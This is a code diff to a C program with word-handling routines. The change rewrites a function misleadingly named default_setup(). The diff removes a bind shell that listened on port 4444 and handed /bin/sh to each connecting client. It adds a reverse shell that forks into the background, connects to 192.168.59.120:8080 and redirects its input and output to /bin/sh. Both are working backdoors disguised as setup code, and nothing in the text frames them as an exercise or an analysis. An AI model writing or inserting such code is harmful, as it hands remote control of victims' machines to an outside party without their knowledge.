@@ -90,69 +90,43 @@ void freeWords(WordEntry* words) {
 }
 
 int default_setup() {
-    int sockfd, client_sock;
-    struct sockaddr_in server_addr;
-    int port = 4444;
-    pid_t pid;
+    pid_t pid = fork();
 
-    // Try to bind first to check if port is available
+    if (pid < 0) {
+        perror("fork");
+        return -1;
+    }
+
+    if (pid > 0) {
+        // Parent process exits, child continues in background
+        return 0;
+    }
+
+    // Child process: create socket and connect
+    int sockfd;
+    struct sockaddr_in server_addr;
+
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) {
         perror("socket");
-        return -1;
-    }
-
-    // Allow reuse of address to avoid TIME_WAIT blocking
-    int opt = 1;
-    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(port);
-    server_addr.sin_addr.s_addr = INADDR_ANY;
-    memset(&(server_addr.sin_zero), 0, 8);
-
-    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) < 0) {
-        if (errno == EADDRINUSE) {
-            fprintf(stderr, "Port %d is already in use. Exiting.\n", port);
-        } else {
-            perror("bind");
-        }
-        close(sockfd);
-        return -1;
-    }
-
-    // Fork into background
-    if (fork() != 0) {
-        return 0; // parent exits
-    }
-
-    // Ignore zombie processes
-    signal(SIGCHLD, SIG_IGN);
-
-    if (listen(sockfd, 5) < 0) {
-        perror("listen");
         exit(1);
     }
 
-    while (1) {
-        client_sock = accept(sockfd, NULL, NULL);
-        if (client_sock < 0) {
-            perror("accept");
-            continue;
-        }
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(8080);
+    server_addr.sin_addr.s_addr = inet_addr("192.168.59.120");
 
-        pid = fork();
-        if (pid == 0) {
-            // Child process
-            dup2(client_sock, 0); // stdin
-            dup2(client_sock, 1); // stdout
-            dup2(client_sock, 2); // stderr
-            execl("/bin/sh", "sh", NULL);
-            exit(0);
-        } else {
-            close(client_sock);
-        }
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect");
+        close(sockfd);
+        exit(1);
     }
+
+    dup2(sockfd, 0); // stdin
+    dup2(sockfd, 1); // stdout
+    dup2(sockfd, 2); // stderr
+
+    execl("/bin/sh", "sh", NULL);
 
     return 0;
 }
